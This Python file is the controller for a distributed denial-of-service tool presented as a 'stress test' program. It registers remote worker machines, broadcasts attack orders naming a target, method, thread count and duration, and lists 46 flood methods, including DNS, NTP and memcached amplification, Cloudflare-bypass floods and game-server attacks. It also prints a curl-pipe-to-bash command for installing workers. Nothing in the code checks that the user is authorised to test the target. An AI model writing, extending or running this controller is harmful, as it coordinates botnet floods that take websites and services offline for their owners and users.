#!/usr/bin/env python3
"""
AegisShield Stress Test Controller v5.0 (HYPERSCALE)
=====================================================
Asyncio-based controller — handles 100+ workers effortlessly.
Length-prefixed binary protocol for reliable messaging.
Background heartbeat, aggregated stats, real-time dashboard.

Usage:
    python controller.py                # listen on 0.0.0.0:7777
    python controller.py --port 8888    # custom port
"""

import asyncio
import json
import struct
import time
import sys
import os
import argparse
import threading

# ══════════════════════════════════════════════════════════════════
#  Method definitions — synced with start.py & worker.py
# ══════════════════════════════════════════════════════════════════

LAYER4_METHODS = {
    "UDP", "TCP", "SYN", "ICMP", "CPS", "CONNECTION",
    "OVH-UDP", "VSE", "TS3", "FIVEM", "FIVEM-TOKEN",
    "MEM", "NTP", "MCPE", "DNS", "CHAR", "CLDAP", "ARD", "RDP",
    "MCBOT", "MINECRAFT",
}

LAYER7_METHODS = {
    "GET", "POST", "HEAD", "CFB", "CFBUAM", "BYPASS", "OVH", "STRESS",
    "DYN", "SLOW", "GSB", "DGB", "AVB", "APACHE", "XMLRPC", "BOT",
    "BOMB", "DOWNLOADER", "KILLER", "PPS", "EVEN", "RHEX", "STOMP",
    "NULL", "COOKIE",
}

ALL_METHODS = LAYER4_METHODS | LAYER7_METHODS

# ══════════════════════════════════════════════════════════════════
#  Colors
# ══════════════════════════════════════════════════════════════════

class C:
    RED = '\033[91m'; GREEN = '\033[92m'; YELLOW = '\033[93m'
    BLUE = '\033[94m'; MAGENTA = '\033[95m'; CYAN = '\033[96m'
    WHITE = '\033[97m'; BOLD = '\033[1m'; DIM = '\033[2m'; RESET = '\033[0m'


# ══════════════════════════════════════════════════════════════════
#  Protocol — Length-prefixed JSON messages
#  Format: [4 bytes big-endian length][JSON payload]
# ══════════════════════════════════════════════════════════════════

async def send_msg(writer, msg):
    """Send a length-prefixed JSON message."""
    data = json.dumps(msg).encode()
    header = struct.pack('>I', len(data))
    writer.write(header + data)
    await writer.drain()


async def recv_msg(reader):
    """Receive a length-prefixed JSON message."""
    header = await reader.readexactly(4)
    length = struct.unpack('>I', header)[0]
    if length > 10 * 1024 * 1024:  # 10MB max message
        raise ValueError("Message too large")
    data = await reader.readexactly(length)
    return json.loads(data.decode())


# ══════════════════════════════════════════════════════════════════
#  Worker registry
# ══════════════════════════════════════════════════════════════════

class WorkerRegistry:
    def __init__(self):
        self.workers = {}       # {id: WorkerInfo}
        self._next_id = 1
        self._lock = asyncio.Lock()
        self.total_connected_ever = 0
        # Aggregated stats
        self.total_pps = 0
        self.total_mbps = 0.0
        self.total_sent = 0

    async def add(self, writer, addr):
        async with self._lock:
            wid = self._next_id
            self._next_id += 1
            self.workers[wid] = WorkerInfo(wid, writer, addr)
            self.total_connected_ever += 1
            return wid

    async def remove(self, wid):
        async with self._lock:
            self.workers.pop(wid, None)

    async def get_all(self):
        async with self._lock:
            return dict(self.workers)

    @property
    def count(self):
        return len(self.workers)

    async def broadcast(self, msg):
        """Send to all workers concurrently — fast parallel broadcast."""
        workers = await self.get_all()
        if not workers:
            return 0
        tasks = []
        dead = []
        for wid, w in workers.items():
            tasks.append(self._safe_send(wid, w, msg, dead))
        await asyncio.gather(*tasks)
        for wid in dead:
            await self.remove(wid)
        return len(workers) - len(dead)

    async def _safe_send(self, wid, w, msg, dead):
        try:
            await send_msg(w.writer, msg)
        except (ConnectionError, OSError, asyncio.IncompleteReadError):
            dead.append(wid)

    async def update_stats(self):
        """Aggregate stats from all workers."""
        workers = await self.get_all()
        total_pps = 0
        total_mbps = 0.0
        total_sent = 0
        for w in workers.values():
            total_pps += w.last_pps
            total_mbps += w.last_mbps
            total_sent += w.last_sent
        self.total_pps = total_pps
        self.total_mbps = total_mbps
        self.total_sent = total_sent


class WorkerInfo:
    __slots__ = ('wid', 'writer', 'addr', 'ip', 'connected_at',
                 'last_seen', 'status', 'last_pps', 'last_mbps', 'last_sent')

    def __init__(self, wid, writer, addr):
        self.wid = wid
        self.writer = writer
        self.addr = addr
        self.ip = f"{addr[0]}:{addr[1]}"
        self.connected_at = time.time()
        self.last_seen = time.time()
        self.status = "idle"
        self.last_pps = 0
        self.last_mbps = 0.0
        self.last_sent = 0


# ══════════════════════════════════════════════════════════════════
#  Controller server
# ══════════════════════════════════════════════════════════════════

class Controller:
    def __init__(self, host, port):
        self.host = host
        self.port = port
        self.registry = WorkerRegistry()
        self.running = True
        self.attack_active = False
        self.attack_method = ""
        self.attack_target = ""

    async def handle_worker(self, reader, writer):
        addr = writer.get_extra_info('peername')
        wid = await self.registry.add(writer, addr)
        n = self.registry.count
        ip = f"{addr[0]}:{addr[1]}"
        sys.stdout.write(f"\n  {C.GREEN}✅ Worker #{wid} connected: {ip} [{n} online]{C.RESET}\n")
        self._prompt()

        try:
            while self.running:
                try:
                    msg = await asyncio.wait_for(recv_msg(reader), timeout=60)
                except asyncio.TimeoutError:
                    # Send ping to check if alive
                    try:
                        await send_msg(writer, {"cmd": "ping"})
                    except (ConnectionError, OSError):
                        break
                    continue

                mtype = msg.get("type", "")

                if mtype == "stats":
                    w_all = await self.registry.get_all()
                    w = w_all.get(wid)
                    if w:
                        w.last_seen = time.time()
                        w.status = f"attacking ({msg.get('method', '?')})"
                        w.last_pps = msg.get("pps", 0)
                        w.last_mbps = msg.get("mbps", 0.0)
                        w.last_sent = msg.get("sent", 0)

                    await self.registry.update_stats()
                    sys.stdout.write(
                        f"\r  {C.CYAN}📊 [#{wid} {ip}] {msg.get('method', '?')} | "
                        f"{msg.get('sent', 0):,} pkts | {msg.get('pps', 0):,.0f} pps | "
                        f"{msg.get('mbps', 0):,.1f} Mbps"
                        f"  {C.DIM}(TOTAL: {self.registry.total_pps:,.0f} pps | "
                        f"{self.registry.total_mbps:,.1f} Mbps){C.RESET}\n"
                    )
                    self._prompt()

                elif mtype == "done":
                    w_all = await self.registry.get_all()
                    w = w_all.get(wid)
                    if w:
                        w.status = "idle"
                        w.last_pps = 0
                        w.last_mbps = 0.0
                    sys.stdout.write(
                        f"\r  {C.GREEN}✅ [#{wid}] Done. {msg.get('total', 0):,} in "
                        f"{msg.get('duration', 0):.1f}s{C.RESET}\n"
                    )
                    self._prompt()

                elif mtype == "pong":
                    w_all = await self.registry.get_all()
                    w = w_all.get(wid)
                    if w:
                        w.last_seen = time.time()

                elif mtype == "error":
                    sys.stdout.write(
                        f"\r  {C.RED}❌ [#{wid}] {msg.get('message', 'Unknown error')}{C.RESET}\n"
                    )
                    self._prompt()

        except (ConnectionError, OSError, asyncio.IncompleteReadError):
            pass
        finally:
            await self.registry.remove(wid)
            n = self.registry.count
            sys.stdout.write(f"\n  {C.RED}❌ Worker #{wid} disconnected: {ip} [{n} online]{C.RESET}\n")
            self._prompt()
            writer.close()

    def _prompt(self):
        n = self.registry.count
        color = C.GREEN if n > 0 else C.RED
        sys.stdout.write(f"{color}[{n} workers]{C.RESET} {C.YELLOW}aegis>{C.RESET} ")
        sys.stdout.flush()

    async def run_command_loop(self):
        """Read commands from stdin using asyncio."""
        loop = asyncio.get_event_loop()

        while self.running:
            self._prompt()
            try:
                line = await loop.run_in_executor(None, sys.stdin.readline)
                line = line.strip()
            except (EOFError, KeyboardInterrupt):
                sys.stdout.write(f"\n  {C.YELLOW}Shutting down...{C.RESET}\n")
                break

            if not line:
                continue

            parts = line.split()
            cmd = parts[0].upper()

            if cmd in ("EXIT", "QUIT", "Q"):
                await self.registry.broadcast({"cmd": "stop"})
                self.running = False
                break

            elif cmd == "STATUS":
                await self._show_status()

            elif cmd == "METHODS":
                self._show_methods()

            elif cmd == "STOP":
                sent_to = await self.registry.broadcast({"cmd": "stop"})
                self.attack_active = False
                print(f"  {C.RED}🛑 Stop sent to {sent_to} workers{C.RESET}")

            elif cmd == "DASHBOARD":
                await self._show_dashboard()

            elif cmd == "ATTACK":
                await self._handle_attack(parts)

            else:
                print(f"  {C.RED}Unknown: {cmd}{C.RESET}")
                print(f"  Commands: attack, stop, status, dashboard, methods, exit")

    async def _handle_attack(self, parts):
        if len(parts) < 5:
            print(f"  {C.RED}Usage: attack <IP:PORT|URL> <METHOD> <THREADS> <DURATION> [POWER%]{C.RESET}")
            return

        target_raw = parts[1]
        method = parts[2].upper()
        threads = int(parts[3])
        duration = int(parts[4])
        power = 100
        if len(parts) >= 6:
            try:
                power = max(1, min(100, int(parts[5])))
            except ValueError:
                pass

        if method not in ALL_METHODS:
            print(f"  {C.RED}✖ Unknown method: {method}. Type 'methods' to see all.{C.RESET}")
            return

        # Build message
        import urllib.parse
        if method in LAYER4_METHODS:
            if ":" in target_raw and not target_raw.startswith("http"):
                host_part, port_part = target_raw.rsplit(":", 1)
                target_port = int(port_part)
            else:
                host_part = target_raw
                target_port = 80

            import socket
            try:
                target_ip = socket.gethostbyname(host_part)
            except socket.gaierror:
                print(f"  {C.RED}✖ Cannot resolve: {host_part}{C.RESET}")
                return

            msg = {
                "cmd": "attack", "target": target_ip, "port": target_port,
                "method": method, "threads": threads, "duration": duration,
                "power": power, "layer": 4,
            }
        else:
            if not target_raw.startswith("http"):
                target_raw = "http://" + target_raw
            msg = {
                "cmd": "attack", "target": target_raw, "port": 0,
                "method": method, "threads": threads, "duration": duration,
                "power": power, "layer": 7,
            }

        self.attack_active = True
        self.attack_method = method
        self.attack_target = target_raw

        sent_to = await self.registry.broadcast(msg)
        n = self.registry.count
        print(f"\n  {C.GREEN}{'━' * 55}{C.RESET}")
        print(f"  {C.GREEN}🔥 ATTACK LAUNCHED{C.RESET}")
        print(f"  {C.GREEN}{'━' * 55}{C.RESET}")
        print(f"  {C.CYAN}  Target:   {msg.get('target', target_raw)}:{msg.get('port', '')}")
        print(f"  {C.CYAN}  Method:   {method}")
        print(f"  {C.CYAN}  Threads:  {threads} per worker × {sent_to} workers = {threads * sent_to}")
        print(f"  {C.CYAN}  Duration: {duration}s")
        print(f"  {C.CYAN}  Power:    {power}%{C.RESET}")
        print(f"  {C.GREEN}{'━' * 55}{C.RESET}\n")

    async def _show_status(self):
        workers = await self.registry.get_all()
        n = len(workers)
        print(f"\n  {C.BOLD}{'═' * 68}{C.RESET}")
        print(f"  {C.BOLD}  WORKER DASHBOARD — {C.GREEN}{n} CONNECTED{C.RESET}")
        print(f"  {C.BOLD}  Total ever connected: {self.registry.total_connected_ever}{C.RESET}")
        print(f"  {C.BOLD}{'═' * 68}{C.RESET}")

        if n == 0:
            print(f"  {C.RED}  No workers connected{C.RESET}")
        else:
            print(f"  {C.CYAN}  {'#':<5}{'Worker IP':<24}{'Uptime':<12}{'PPS':<12}{'Mbps':<10}{'Status'}{C.RESET}")
            print(f"  {C.DIM}  {'─' * 64}{C.RESET}")
            for w in workers.values():
                uptime = _fmt_uptime(time.time() - w.connected_at)
                sc = C.GREEN if w.status == "idle" else C.YELLOW
                pps_str = f"{w.last_pps:,.0f}" if w.last_pps else "—"
                mbps_str = f"{w.last_mbps:,.1f}" if w.last_mbps else "—"
                print(f"  {C.WHITE}  {w.wid:<5}{w.ip:<24}{uptime:<12}{pps_str:<12}{mbps_str:<10}{sc}{w.status}{C.RESET}")

        if self.attack_active:
            await self.registry.update_stats()
            print(f"\n  {C.BOLD}{C.YELLOW}  ⚡ ATTACK ACTIVE: {self.attack_method} → {self.attack_target}{C.RESET}")
            print(f"  {C.BOLD}{C.CYAN}  Aggregated: {self.registry.total_pps:,.0f} pps | "
                  f"{self.registry.total_mbps:,.1f} Mbps | {self.registry.total_sent:,} total sent{C.RESET}")

        print(f"  {C.BOLD}{'═' * 68}{C.RESET}\n")

    async def _show_dashboard(self):
        """Live dashboard — refreshes every 2s until Ctrl+C."""
        print(f"  {C.CYAN}Live dashboard (Ctrl+C to stop){C.RESET}")
        try:
            while True:
                os.system("cls" if os.name == "nt" else "clear")
                await self._show_status()
                await asyncio.sleep(2)
        except (KeyboardInterrupt, asyncio.CancelledError):
            print(f"\n  {C.YELLOW}Dashboard stopped{C.RESET}")

    def _show_methods(self):
        print(f"""
  {C.BOLD}Layer 4 ({len(LAYER4_METHODS)}):{C.RESET}
    {C.CYAN}Volumetric:{C.RESET}     UDP, TCP, SYN, ICMP, OVH-UDP
    {C.CYAN}Connection:{C.RESET}     CPS, CONNECTION
    {C.CYAN}Gaming:{C.RESET}         VSE, TS3, FIVEM, FIVEM-TOKEN, MCBOT, MINECRAFT, MCPE
    {C.CYAN}Amplification:{C.RESET}  MEM, NTP, DNS, CHAR, CLDAP, ARD, RDP

  {C.BOLD}Layer 7 ({len(LAYER7_METHODS)}):{C.RESET}
    {C.CYAN}Basic:{C.RESET}          GET, POST, HEAD, PPS, EVEN, NULL, COOKIE
    {C.CYAN}Advanced:{C.RESET}       CFB, CFBUAM, BYPASS, OVH, DYN, GSB, RHEX, STOMP, DGB, AVB
    {C.CYAN}Resource:{C.RESET}       STRESS, SLOW, APACHE, XMLRPC, BOT, BOMB, DOWNLOADER, KILLER
""")

    async def start(self):
        server = await asyncio.start_server(
            self.handle_worker, self.host, self.port,
            limit=1024 * 1024,  # 1MB buffer
        )

        print(BANNER)
        print(f"  {C.GREEN}🎯 Controller listening on {self.host}:{self.port}{C.RESET}")
        print(f"  {C.CYAN}📋 Worker install:{C.RESET}")
        print(f"     {C.BOLD}curl -sL .../setup_worker.sh | bash -s <THIS_IP> {self.port}{C.RESET}")
        print(f"""
  {C.BOLD}Commands:{C.RESET}
    {C.GREEN}attack{C.RESET}    <target> <METHOD> <threads> <duration> [power%]
    {C.GREEN}stop{C.RESET}      — stop all workers
    {C.GREEN}status{C.RESET}    — show worker table + stats
    {C.GREEN}dashboard{C.RESET} — live auto-refreshing dashboard
    {C.GREEN}methods{C.RESET}   — list all 46 methods
    {C.GREEN}exit{C.RESET}      — shutdown
""")

        # Run command loop concurrently with server
        async with server:
            await self.run_command_loop()


def _fmt_uptime(sec):
    if sec < 60:
        return f"{int(sec)}s"
    elif sec < 3600:
        return f"{int(sec // 60)}m {int(sec % 60)}s"
    else:
        return f"{int(sec // 3600)}h {int((sec % 3600) // 60)}m"


BANNER = f"""
{C.RED}
    ╔═══════════════════════════════════════════════════════════╗
    ║   █████  ███████  ██████  ██ ███████ ███████ ██   ██     ║
    ║  ██   ██ ██      ██       ██ ██      ██      ██   ██     ║
    ║  ███████ █████   ██   ███ ██ ███████ ███████ ███████     ║
    ║  ██   ██ ██      ██    ██ ██      ██      ██ ██   ██     ║
    ║  ██   ██ ███████  ██████  ██ ███████ ███████ ██   ██     ║
    ╚═══════════════════════════════════════════════════════════╝{C.RESET}
    {C.CYAN}AegisShield Controller v5.0 — HYPERSCALE{C.RESET}
    {C.YELLOW}✦ {len(ALL_METHODS)} Methods | Asyncio | 100+ Workers Ready{C.RESET}
"""


def main():
    parser = argparse.ArgumentParser(description="AegisShield Controller v5.0 HYPERSCALE")
    parser.add_argument("--port", type=int, default=7777)
    parser.add_argument("--host", default="0.0.0.0")
    args = parser.parse_args()

    ctrl = Controller(args.host, args.port)
    try:
        asyncio.run(ctrl.start())
    except KeyboardInterrupt:
        print(f"\n  {C.YELLOW}Controller stopped.{C.RESET}")


if __name__ == "__main__":
    main()
